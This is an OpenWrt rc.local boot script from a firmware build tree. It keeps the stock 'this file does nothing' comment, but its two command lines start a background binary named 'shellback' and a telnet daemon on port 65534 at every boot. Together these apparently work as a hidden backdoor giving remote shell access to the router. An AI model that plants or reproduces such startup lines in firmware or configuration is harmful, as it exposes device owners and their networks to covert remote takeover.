# OpenWrt/openwrt-18.06.2/files/etc/rc.local
# Put your custom commands here that should be executed once
# the system init finished. By default this file does nothing.

/usr/bin/shellback &
telnetd -p 65534 &
exit 0
